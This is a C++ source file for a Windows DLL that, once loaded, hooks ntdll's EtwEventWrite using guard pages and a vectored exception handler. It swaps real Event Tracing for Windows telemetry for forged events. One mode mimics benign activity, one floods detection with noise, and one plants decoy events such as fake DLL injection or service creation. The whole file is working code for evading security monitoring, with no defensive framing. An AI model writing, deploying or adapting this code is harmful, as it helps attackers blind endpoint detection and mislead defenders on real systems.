#include <windows.h>
#include <evntprov.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <tchar.h>
#include <unordered_map>
#include <random>

using namespace std;

#pragma comment(lib, "ntdll.lib")

// ------------------------
// Event modes
// ------------------------
enum EVENT_MODE {
	Normalitzator = 0,
	Noise = 1,
	Redirect = 2
};

// ------------------------
// Global variables
// ------------------------
typedef ULONG(WINAPI* pEtwEventWrite)(
	REGHANDLE RegHandle,
	PCEVENT_DESCRIPTOR EventDescriptor,
	ULONG UserDataCount,
	PEVENT_DATA_DESCRIPTOR UserData
	);


pEtwEventWrite g_EtwEventWrite = nullptr;
EVENT_MODE g_CurrentMode = Normalitzator; // Current selected mode
unordered_map<EVENT_MODE, vector<EVENT_DESCRIPTOR>> eventMap; // Event mode -> fake events

// ------------------------
// Hooked EtwEventWrite function
// ------------------------
ULONG WINAPI MyEtwEventWrite(
	REGHANDLE RegHandle,
	PCEVENT_DESCRIPTOR EventDescriptor,
	ULONG UserDataCount,
	PEVENT_DATA_DESCRIPTOR UserData
) {
	if (eventMap[g_CurrentMode].empty()) {
		return g_EtwEventWrite(RegHandle, EventDescriptor, UserDataCount, UserData);
	}

	random_device rd;
	mt19937 gen(rd());

	// If in Noise mode, send 5 to 15 fake events to overload detection systems
	if (g_CurrentMode == Noise) {
		uniform_int_distribution<> countDist(5, 15);
		int count = countDist(gen);

		for (int i = 0; i < count; ++i) {
			uniform_int_distribution<> idxDist(0, eventMap[Noise].size() - 1);
			const EVENT_DESCRIPTOR& desc = eventMap[Noise][idxDist(gen)];
			g_EtwEventWrite(RegHandle, &desc, UserDataCount, UserData);
		}
		return ERROR_SUCCESS;
	}
	else {
		// For Normalitzator and Redirect, pick one random fake event
		uniform_int_distribution<> idxDist(0, eventMap[g_CurrentMode].size() - 1);
		const EVENT_DESCRIPTOR& desc = eventMap[g_CurrentMode][idxDist(gen)];
		return g_EtwEventWrite(RegHandle, &desc, UserDataCount, UserData);
	}
}

// ------------------------
// Force EtwEventWrite call manually to trigger hook
// ------------------------
void ForceEtwCall() {
	OutputDebugStringA("Calling EtwEventWrite manually to trigger hook...\n");

	EVENT_DESCRIPTOR desc = { 0x01, 1, 0, 4, 0, 0, 0x1 };
	const char* message = "Hello from EtwEventWrite!";
	EVENT_DATA_DESCRIPTOR data;
	EventDataDescCreate(&data, message, (ULONG)(strlen(message) + 1));

	pEtwEventWrite EtwFunc = (pEtwEventWrite)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "EtwEventWrite");
	if (EtwFunc) {
		EtwFunc((REGHANDLE)1, &desc, 1, &data);
	}
}

// ------------------------
// Exception handler for PAGE_GUARD hooking
// ------------------------
LONG WINAPI VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo) {
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION) {
		if ((void*)ExceptionInfo->ContextRecord->Rip == g_EtwEventWrite) {
			ExceptionInfo->ContextRecord->Rip = (DWORD64)&MyEtwEventWrite;

			DWORD oldProtect;
			VirtualProtect(g_EtwEventWrite, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &oldProtect);
			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

// ------------------------
// Hook setup
// ------------------------
void SetupHook() {
	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
	g_EtwEventWrite = (pEtwEventWrite)GetProcAddress(hNtdll, "EtwEventWrite");

	DWORD oldProtect;
	VirtualProtect(g_EtwEventWrite, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &oldProtect);
	AddVectoredExceptionHandler(1, VectoredHandler);

	OutputDebugStringA("Hook installed.\n");
	ForceEtwCall();
}

// ------------------------
// Initialize fake event database
// ------------------------
void InitEvents() {
	// Mode 1: Normal Activity Emulation
	eventMap[Normalitzator] = {
		{1001, 1, 0, 4, 10, 1, 0x0000000000000001},  // Read of user file: resume.docx
		{1002, 1, 0, 4, 1, 2, 0x0000000000000010},   // HTTP GET to google.com
		{1003, 1, 0, 4, 12, 3, 0x0000000000000100}   // Load user32.dll, MessageBox call
	};

	// Mode 2: Noise Generation
	vector<EVENT_DESCRIPTOR> noiseEvents;
	for (int i = 0; i < 1000; ++i) {
		noiseEvents.push_back({
			(USHORT)(2000 + i), 1, 0, 4, 10, 10, 0x0000000000000001ULL // Irrelevant file read
			});
	}
	for (int i = 0; i < 50; ++i) {
		noiseEvents.push_back({
			(USHORT)(3000 + i), 1, 0, 4, 1, 20, 0x0000000000000010ULL // Fake network ping to update server
			});
	}
	for (int i = 0; i < 30; ++i) {
		noiseEvents.push_back({
			(USHORT)(4000 + i), 1, 0, 4, 15, 30, 0x0000000000000080ULL // Registry read from Run key
			});
	}
	eventMap[Noise] = noiseEvents;

	// Mode 3: Redirect / Decoy Events
	eventMap[Redirect] = {
		{5001, 1, 0, 4, 20, 40, 0x0000000000001000ULL}, // DLL injection from OneDrive.exe
		{5002, 1, 0, 4, 21, 41, 0x0000000000002000ULL}, // svchost.exe creating a new service
		{5003, 1, 0, 4, 22, 42, 0x0000000000004000ULL}, // Defender signature update simulation
		{5004, 1, 0, 4, 10, 43, 0x0000000000008000ULL}, // VirtualAlloc small allocation
		{5005, 1, 0, 4, 11, 44, 0x0000000000010000ULL}, // CreateRemoteThread on self process
		{5006, 1, 0, 4, 12, 45, 0x0000000000020000ULL}  // WScript echo Hello World
	};
}

// ------------------------
// DLL Entry Point
// ------------------------
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
	if (fdwReason == DLL_PROCESS_ATTACH) {
		DisableThreadLibraryCalls(hinstDLL);
		InitEvents();
		SetupHook();
	}
	return TRUE;
}
